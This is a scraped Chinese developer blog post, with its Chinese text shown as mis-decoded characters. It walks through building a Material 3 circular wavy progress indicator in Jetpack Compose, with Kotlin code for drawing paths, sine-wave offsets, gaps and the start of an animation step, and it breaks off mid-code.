            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2549135752044601/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨ç™½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:18:44.000Z" title="Mon Nov 24 2025 14:18:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ•ˆæœ</h2>
<p>è¦å®ç°çš„æ•ˆæœæ˜¯ Material 3 çš„ <code>CircularWavyProgressIndicator</code>ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªå¸¦æ³¢æµªçš„åœ†å½¢è¿›åº¦æ¡ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcomposables.com%2Fdocs%2Fandroidx.compose.material3%2Fmaterial3%2Fcomponents%2FCircularWavyProgressIndicator" target="_blank" title="https://composables.com/docs/androidx.compose.material3/material3/components/CircularWavyProgressIndicator" ref="nofollow noopener noreferrer">åœ†å½¢æ³¢æµªè¿›åº¦æŒ‡ç¤ºå™¨</a></p>
<h2 data-id="heading-1">å®ç°æ­¥éª¤</h2>
<h3 data-id="heading-2">ç»˜åˆ¶è½¨é“å’Œå¹³æ»‘æ³¢æµª</h3>
<p>é¦–å…ˆæˆ‘ä»¬å°†è½¨é“å’Œâ€œç¢¾å¹³â€çš„æ³¢æµªç»˜åˆ¶å‡ºæ¥ã€‚</p>
<p>å¯¹äºæ™®é€šåœ†å¼§ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šä½¿ç”¨ <code>DrawScope.drawArc()</code>ã€‚ä½†æˆ‘ä»¬éœ€è¦ç»˜åˆ¶æ³¢æµªï¼Œåç»­éœ€è¦å¯¹æ¯ä¸ªç‚¹è¿›è¡Œåç§»ï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨ <code>Path()</code> æ¥è¿›è¡Œæ¯ä¸ªç‚¹çš„ç»˜åˆ¶ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CircularWavyProgressIndicatorStep1</span><span class="hljs-params">(
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    waveColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.primary, <span class="hljs-comment">// æ³¢æµªé¢œè‰²</span>
    trackColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.secondaryContainer, <span class="hljs-comment">// è½¨é“é¢œè‰²</span>
    waveStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp, <span class="hljs-comment">// æ³¢æµªç¬”è§¦å®½åº¦</span>
    trackStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp, <span class="hljs-comment">// è½¨é“ç¬”è§¦å®½åº¦</span>
)</span></span> {
    <span class="hljs-comment">// å¤ç”¨ Path å¯¹è±¡ï¼Œé¿å…é‡ç»„æ—¶çš„é‡å»ºå¯¼è‡´å†…å­˜æŠ–åŠ¨</span>
    <span class="hljs-keyword">val</span> wavePath = remember { Path() }
    <span class="hljs-keyword">val</span> trackPath = remember { Path() }

    <span class="hljs-keyword">val</span> density = LocalDensity.current
    <span class="hljs-comment">// å°† Dp è½¬ä¸º Px</span>
    <span class="hljs-keyword">val</span> waveStrokeWidthPx = with(density) { waveStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> trackStrokeWidthPx = with(density) { trackStrokeWidth.toPx() }

    Canvas(modifier = modifier.size(<span class="hljs-number">48.</span>dp)) {
        <span class="hljs-keyword">val</span> center = <span class="hljs-keyword">this</span>.center
        <span class="hljs-comment">// é‡‡æ ·ï¼š1åº¦ç”»ä¸€æ¬¡</span>
        <span class="hljs-keyword">val</span> step = <span class="hljs-number">1</span>

        <span class="hljs-keyword">val</span> maxStroke = maxOf(waveStrokeWidthPx, trackStrokeWidthPx)
        <span class="hljs-comment">// åŸºç¡€åŠå¾„ï¼šå®¹å™¨å®½çš„ä¸€åŠ - ç¬”è§¦çš„ä¸€åŠï¼Œç¡®ä¿ç”»ç¬”ä¸è¶…å‡º Canvas è¾¹ç•Œ</span>
        <span class="hljs-keyword">val</span> baseRadius = (size.minDimension - maxStroke) / <span class="hljs-number">2f</span>

        <span class="hljs-comment">// --- ç»˜åˆ¶æ³¢æµª ---</span>
        wavePath.rewind() <span class="hljs-comment">// æ¸…ç©ºè·¯å¾„</span>
        <span class="hljs-keyword">val</span> endAngle = <span class="hljs-number">180f</span> <span class="hljs-comment">// æš‚æ—¶ç”» 180 åº¦</span>

        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span>.endAngle.toInt() step step) {
            <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
            <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble()) <span class="hljs-comment">// è§’åº¦è½¬å¼§åº¦</span>

            <span class="hljs-keyword">val</span> x = center.x + (baseRadius * cos(rad)).toFloat()
            <span class="hljs-keyword">val</span> y = center.y + (baseRadius * sin(rad)).toFloat()

            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) {
                wavePath.moveTo(x, y)
            } <span class="hljs-keyword">else</span> {
                wavePath.lineTo(x, y)
            }
        }
        drawPath(
            path = wavePath,
            color = waveColor,
            style = Stroke(width = waveStrokeWidthPx, cap = StrokeCap.Round)
        )

        <span class="hljs-comment">// --- ç»˜åˆ¶è½¨é“ ---</span>
        trackPath.rewind()
        <span class="hljs-keyword">val</span> trackStartAngle = endAngle
        <span class="hljs-keyword">val</span> trackEndAngle = <span class="hljs-number">360f</span>

        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> trackStartAngle.toInt()..trackEndAngle.toInt() step step) {
            <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
            <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())

            <span class="hljs-keyword">val</span> x = center.x + (baseRadius * cos(rad)).toFloat()
            <span class="hljs-keyword">val</span> y = center.y + (baseRadius * sin(rad)).toFloat()

            <span class="hljs-keyword">if</span> (i == trackStartAngle.toInt()) {
                <span class="hljs-comment">// ç§»åˆ°èµ·å§‹ç‚¹</span>
                trackPath.moveTo(x, y)
            } <span class="hljs-keyword">else</span> {
                trackPath.lineTo(x, y)
            }
        }
        drawPath(
            path = trackPath,
            color = trackColor,
            style = Stroke(width = trackStrokeWidthPx, cap = StrokeCap.Round)
        )
    }
}
</code></pre>
<p>æ³¨æ„ï¼š</p>
<ol>
<li>ä¸ºäº†é¿å…åœ¨é‡ç»„æ—¶ï¼Œé¢‘ç¹åˆ›å»º <code>Path</code> å¯¹è±¡å¯¼è‡´å†…å­˜æŠ–åŠ¨ã€‚æˆ‘ä»¬ä½¿ç”¨äº† <code>remember{ Path() }</code> æ¥å¤ç”¨è·¯å¾„å¯¹è±¡ã€‚ä¸è¿‡è¦åœ¨æ¯æ¬¡ç»˜åˆ¶å‰ï¼Œè°ƒç”¨ <code>rewind()</code> æ¸…ç©ºå·²æœ‰è·¯å¾„ã€‚</li>
<li><code>sin()</code> å’Œ <code>cos()</code> æ¥æ”¶çš„éƒ½æ˜¯å¼§åº¦ï¼Œéœ€è¦è°ƒç”¨ <code>Math.toRadians()</code>ï¼Œå°†è§’åº¦è½¬ä¸ºå¼§åº¦ã€‚</li>
</ol>
<p>è¿è¡Œæ•ˆæœï¼š</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/345d233358e54b89aa146ac6ccb98f15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo55m9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598723&amp;x-signature=Cb5yecsEaccEIcuc4G5LQBqr3Uo%3D" alt="image.png" width="50%" loading="lazy"/>
<h3 data-id="heading-3">ç»˜åˆ¶æ³¢æµªçº¿</h3>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥ç»™åœ†åŠ ä¸Šâ€œè¤¶çš±â€ã€‚åŸç†ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨è®¡ç®—åŠå¾„æ—¶ï¼Œå åŠ ä¸€ä¸ªæ­£å¼¦å‡½æ•°å³å¯ã€‚</p>
<p>å…¬å¼ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>=</mo><mtext>åŸºç¡€åŠå¾„</mtext><mo>+</mo><mtext>æŒ¯å¹…</mtext><mo>Ã—</mo><mi>sin</mi><mo>â¡</mo><mo stretchy="false">(</mo><mtext>å¼§åº¦</mtext><mo>Ã—</mo><mtext>é¢‘ç‡</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R = \text{åŸºç¡€åŠå¾„} + \text{æŒ¯å¹…} \times \sin(\text{å¼§åº¦} \times \text{é¢‘ç‡})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord text"><span class="mord cjk_fallback">åŸºç¡€åŠå¾„</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord text"><span class="mord cjk_fallback">æŒ¯å¹…</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop">sin</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">å¼§åº¦</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord cjk_fallback">é¢‘ç‡</span></span><span class="mclose">)</span></span></span></span></span></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CircularWavyProgressIndicatorStep2</span><span class="hljs-params">(
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    waveColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.primary,
    trackColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.secondaryContainer,
    waveStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    trackStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    amplitude: <span class="hljs-type">Dp</span> = <span class="hljs-number">1.2</span>.dp, <span class="hljs-comment">// æŒ¯å¹…ï¼šå†³å®šæ³¢æµªèµ·ä¼çš„é«˜åº¦</span>
    wavelength: <span class="hljs-type">Dp</span> = <span class="hljs-number">15.</span>dp, <span class="hljs-comment">// æ³¢é•¿ï¼šå†³å®šæ³¢æµªçš„å¯†é›†ç¨‹åº¦</span>
)</span></span> {
    <span class="hljs-keyword">val</span> wavePath = remember { Path() }
    <span class="hljs-keyword">val</span> trackPath = remember { Path() }

    <span class="hljs-keyword">val</span> density = LocalDensity.current
    <span class="hljs-keyword">val</span> waveStrokeWidthPx = with(density) { waveStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> trackStrokeWidthPx = with(density) { trackStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> amplitudePx = with(density) { amplitude.toPx() }
    <span class="hljs-keyword">val</span> wavelengthPx = with(density) { wavelength.toPx() }

    Canvas(modifier = modifier.size(<span class="hljs-number">48.</span>dp)) {
        <span class="hljs-keyword">val</span> center = <span class="hljs-keyword">this</span>.center
        <span class="hljs-keyword">val</span> step = <span class="hljs-number">1</span>
        <span class="hljs-keyword">val</span> maxStroke = maxOf(waveStrokeWidthPx, trackStrokeWidthPx)
        <span class="hljs-comment">// æ³¨æ„ï¼šåŠå¾„è¦é¢å¤–å‡å»æŒ¯å¹…ï¼Œé˜²æ­¢æ³¢å³°è¶…å‡ºè¾¹ç•Œè¢«æˆªæ–­</span>
        <span class="hljs-keyword">val</span> baseRadius = (size.minDimension - maxStroke) / <span class="hljs-number">2f</span> - amplitudePx

        <span class="hljs-comment">// --- ç»˜åˆ¶æ³¢æµª ---</span>
        wavePath.rewind()

        <span class="hljs-comment">// è®¡ç®—æ³¢æµªçš„æ€»å‘¨é•¿å’Œé¢‘ç‡</span>
        <span class="hljs-keyword">val</span> circumference = <span class="hljs-number">2</span> * PI * baseRadius
        <span class="hljs-keyword">val</span> frequency = circumference / wavelengthPx

        <span class="hljs-keyword">val</span> endAngle = <span class="hljs-number">180f</span>

        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span>.endAngle.toInt() step step) {
            <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
            <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())

            <span class="hljs-comment">// å åŠ æ­£å¼¦æ³¢åç§»</span>
            <span class="hljs-keyword">val</span> waveOffset = amplitudePx * sin((rad * frequency))
            <span class="hljs-keyword">val</span> r = baseRadius + waveOffset

            <span class="hljs-keyword">val</span> x = center.x + (r * cos(rad)).toFloat()
            <span class="hljs-keyword">val</span> y = center.y + (r * sin(rad)).toFloat()

            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) wavePath.moveTo(x, y) <span class="hljs-keyword">else</span> wavePath.lineTo(x, y)
        }
        drawPath(
            path = wavePath,
            color = waveColor,
            style = Stroke(width = waveStrokeWidthPx, cap = StrokeCap.Round)
        )

        <span class="hljs-comment">// --- ç»˜åˆ¶è½¨é“ ---</span>
        trackPath.rewind()
        <span class="hljs-keyword">val</span> trackStartAngle = endAngle
        <span class="hljs-keyword">val</span> trackEndAngle = <span class="hljs-number">360f</span>

        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> trackStartAngle.toInt()..trackEndAngle.toInt() step step) {
            <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
            <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())

            <span class="hljs-keyword">val</span> x = center.x + (baseRadius * cos(rad)).toFloat()
            <span class="hljs-keyword">val</span> y = center.y + (baseRadius * sin(rad)).toFloat()

            <span class="hljs-keyword">if</span> (i == trackStartAngle.toInt()) trackPath.moveTo(x, y) <span class="hljs-keyword">else</span> trackPath.lineTo(x, y)
        }
        drawPath(
            path = trackPath,
            color = trackColor,
            style = Stroke(width = trackStrokeWidthPx, cap = StrokeCap.Round)
        )
    }
}
</code></pre>
<p>è¿è¡Œæ•ˆæœï¼š</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/322bcbc85ade401d863bf61add2688ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo55m9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598723&amp;x-signature=axypaX6yxzOnunbnMyxtpgppYlw%3D" alt="image.png" width="50%" loading="lazy"/>
<h3 data-id="heading-4">å¤„ç†é—´éš™</h3>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè½¨é“å’Œæ³¢æµªé‡å äº†ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ª <code>gapSize</code>ï¼ˆé—´éš™ï¼‰ã€‚</p>
<p>å…¶å®ä¹Ÿå°±æ˜¯å°†é—´éš™å¯¹åº”çš„å¼§é•¿è½¬æˆè§’åº¦ï¼Œåœ¨ç»˜åˆ¶æ—¶ï¼Œçœç•¥è¿™éƒ¨åˆ†è§’åº¦ç½¢äº†ã€‚</p>
<p>ä¸è¿‡ï¼Œè¦è€ƒè™‘åˆ° <code>StrokeCap.Round</code> åœ†å¤´ç¬”è§¦å‘å¤–å»¶ä¼¸çš„<strong>åŠä¸ªç¬”è§¦å®½åº¦</strong>çš„åŠåœ†ã€‚</p>
<p>æ‰€ä»¥æœ€ç»ˆçš„å¼§é•¿ = æœŸæœ›çš„é—´éš™ + ä¸€ä¸ªç¬”è§¦å®½åº¦ï¼ˆä¸¤ä¸ªåŠåœ†ï¼‰</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CircularWavyProgressIndicatorStep3</span><span class="hljs-params">(
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    waveColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.primary,
    trackColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.secondaryContainer,
    waveStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    trackStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    amplitude: <span class="hljs-type">Dp</span> = <span class="hljs-number">1.2</span>.dp,
    wavelength: <span class="hljs-type">Dp</span> = <span class="hljs-number">15.</span>dp,
    gapSize: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp, <span class="hljs-comment">// é—´éš™å¤§å°</span>
)</span></span> {
    <span class="hljs-keyword">val</span> wavePath = remember { Path() }
    <span class="hljs-keyword">val</span> trackPath = remember { Path() }
    <span class="hljs-keyword">val</span> density = LocalDensity.current

    <span class="hljs-keyword">val</span> waveStrokeWidthPx = with(density) { waveStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> trackStrokeWidthPx = with(density) { trackStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> amplitudePx = with(density) { amplitude.toPx() }
    <span class="hljs-keyword">val</span> wavelengthPx = with(density) { wavelength.toPx() }
    <span class="hljs-keyword">val</span> gapSizePx = with(density) { gapSize.toPx() }

    Canvas(modifier = modifier.size(<span class="hljs-number">48.</span>dp)) {
        <span class="hljs-keyword">val</span> center = <span class="hljs-keyword">this</span>.center
        <span class="hljs-keyword">val</span> step = <span class="hljs-number">1</span>
        <span class="hljs-keyword">val</span> maxStroke = maxOf(waveStrokeWidthPx, trackStrokeWidthPx)
        <span class="hljs-keyword">val</span> baseRadius = (size.minDimension - maxStroke) / <span class="hljs-number">2f</span> - amplitudePx

        <span class="hljs-comment">// ç‰©ç†å¼§é•¿ = è§†è§‰é—´éš™ + ç”»ç¬”(ç¬”è§¦)å®½åº¦</span>
        <span class="hljs-keyword">val</span> effectiveGapLength = gapSizePx + maxStroke
        <span class="hljs-comment">// å°†å¼§é•¿è½¬æ¢ä¸ºè§’åº¦</span>
        <span class="hljs-keyword">val</span> gapAngle = Math.toDegrees((effectiveGapLength / baseRadius).toDouble()).toFloat()

        <span class="hljs-comment">// --- ç»˜åˆ¶æ³¢æµª ---</span>
        wavePath.rewind()
        <span class="hljs-keyword">val</span> circumference = <span class="hljs-number">2</span> * PI * baseRadius
        <span class="hljs-keyword">val</span> frequency = circumference / wavelengthPx
        <span class="hljs-keyword">val</span> endAngle = <span class="hljs-number">180f</span>

        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span>.endAngle.toInt() step step) {
            <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
            <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())
            <span class="hljs-keyword">val</span> waveOffset = amplitudePx * sin((rad * frequency))
            <span class="hljs-keyword">val</span> r = baseRadius + waveOffset

            <span class="hljs-keyword">val</span> x = center.x + (r * cos(rad)).toFloat()
            <span class="hljs-keyword">val</span> y = center.y + (r * sin(rad)).toFloat()

            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) wavePath.moveTo(x, y) <span class="hljs-keyword">else</span> wavePath.lineTo(x, y)
        }
        drawPath(
            path = wavePath,
            color = waveColor,
            style = Stroke(width = waveStrokeWidthPx, cap = StrokeCap.Round)
        )

        <span class="hljs-comment">// --- ç»˜åˆ¶è½¨é“ ---</span>
        trackPath.rewind()

        <span class="hljs-comment">// è½¨é“èµ·ç‚¹ = æ³¢æµªç»ˆç‚¹ + é—´éš™è§’åº¦</span>
        <span class="hljs-keyword">val</span> trackStartAngle = endAngle + gapAngle
        <span class="hljs-comment">// è½¨é“ç»ˆç‚¹ = 360åº¦ - é—´éš™è§’åº¦</span>
        <span class="hljs-keyword">val</span> trackEndAngle = <span class="hljs-number">360f</span> - gapAngle

        <span class="hljs-comment">// åªæœ‰å½“å‰©ä½™ç©ºé—´è¶³å¤Ÿæ—¶æ‰ç»˜åˆ¶è½¨é“</span>
        <span class="hljs-keyword">if</span> (trackStartAngle &lt; trackEndAngle) {
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> trackStartAngle.toInt()..trackEndAngle.toInt() step step) {
                <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
                <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())
                <span class="hljs-keyword">val</span> x = center.x + (baseRadius * cos(rad)).toFloat()
                <span class="hljs-keyword">val</span> y = center.y + (baseRadius * sin(rad)).toFloat()

                <span class="hljs-keyword">if</span> (i == trackStartAngle.toInt()) trackPath.moveTo(x, y) <span class="hljs-keyword">else</span> trackPath.lineTo(x, y)
            }
            drawPath(
                path = trackPath,
                color = trackColor,
                style = Stroke(width = trackStrokeWidthPx, cap = StrokeCap.Round)
            )
        }
    }
}
</code></pre>
<p>è¿è¡Œæ•ˆæœï¼š</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6c2d7968061460fbc95aa109d802105~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo55m9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598723&amp;x-signature=28O%2FCozWx9mBvlYvhets%2BDvyOtA%3D" alt="image.png" width="50%" loading="lazy"/>
<h3 data-id="heading-5">æ·»åŠ åŠ¨ç”»</h3>
<p>æœ€åï¼Œæˆ‘ä»¬æ¥è®©è¿™ä¸ªè¿›åº¦æ¡åŠ¨èµ·æ¥ã€‚æˆ‘ä»¬éœ€è¦ä¸‰ä¸ªç»´åº¦çš„åŠ¨ç”»ï¼š</p>
<ul>
<li>
<p><strong>SweepAngle(å‘¼å¸)</strong>ï¼šæ§åˆ¶æ³¢æµªè¿›åº¦æ¡çš„é•¿çŸ­ã€‚æˆ‘ä»¬ä½¿ç”¨äº† <code>keyframes</code>ï¼Œå®ç°äº†æ³¢æµªæ…¢å¸å¿«å‘¼çš„éçº¿æ€§èŠ‚å¥ã€‚</p>
</li>
<li>
<p><strong>Rotation(è‡ªè½¬)</strong>ï¼šæ§åˆ¶æ•´ä¸ªåœ†ç¯çš„æ—‹è½¬ã€‚æˆ‘ä»¬è‡ªå®šä¹‰äº†è´å¡å°”æ›²çº¿ï¼Œå®ç°äº†è„‰å†²å¼çš„æ—‹è½¬ã€‚</p>
</li>
<li>
<p><strong>PhaseShift(æµåŠ¨)</strong>ï¼šæ§åˆ¶æ³¢æµªçš„æµåŠ¨ã€‚é€šè¿‡æ”¹å˜æ³¢çš„ç›¸ä½åç§»æ¥å®ç°çš„ï¼Œè¿™æ ·å³ä½¿åœ†ç¯æ•´ä½“ä¸è½¬ï¼Œæ³¢æµªçœ‹èµ·æ¥ä¹Ÿåƒåœ¨å‘å‰æµåŠ¨ã€‚</p>
</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">CircularWavyProgressIndicatorStep4</span><span class="hljs-params">(
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    waveColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.primary,
    trackColor: <span class="hljs-type">Color</span> = MaterialTheme.colorScheme.secondaryContainer,
    waveStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    trackStrokeWidth: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
